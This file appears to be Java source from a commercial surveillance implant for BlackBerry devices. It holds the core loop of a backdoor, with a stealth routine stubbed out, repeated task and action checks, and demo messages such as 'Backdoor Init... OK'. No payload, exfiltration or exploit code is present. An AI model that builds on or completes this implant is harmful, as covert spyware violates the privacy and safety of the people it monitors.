/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Core.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * Classe Core, contiene il main.
 */
public class Core {

    /** The debug. */
    private static Debug debug = new Debug("Core", DebugLevel.VERBOSE);

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        debug.init(true,false,true);        
        debug.trace("RCSBlackBerry launching");

        Core core = new Core();
        boolean ret = core.run();

        debug.trace("RCSBlackBerry exit, return " + ret);
    }

    /** The task obj. */
    private Task taskObj = new Task();

    /**
     * Gets the my name.
     */
    private void getMyName() {
        // TODO Auto-generated method stub

    }

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public final boolean run() {
        Utils.sleep(500);

        getMyName();
        stealth();

        Utils.sleep(5000);

        for (;;) {
            if (taskObj.taskInit() == false) {
                debug.error("TaskInit() FAILED");
                Msg.demo("Backdoor Init... FAILED");
                Msg.show();
                return false;
            } else {
                debug.trace("TaskInit() OK");
                // CHECK: Status o init?
                Msg.demo("Backdoor Init... OK");
                Msg.show();
            }

            if (taskObj.checkActions() == false) {
                debug.error("CheckActions() [Uninstalling?] FAILED");

                Msg.demo("Backdoor Uninstalled, reboot the device");
                return false;
            }
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {
        // TODO Auto-generated method stub

    }
}
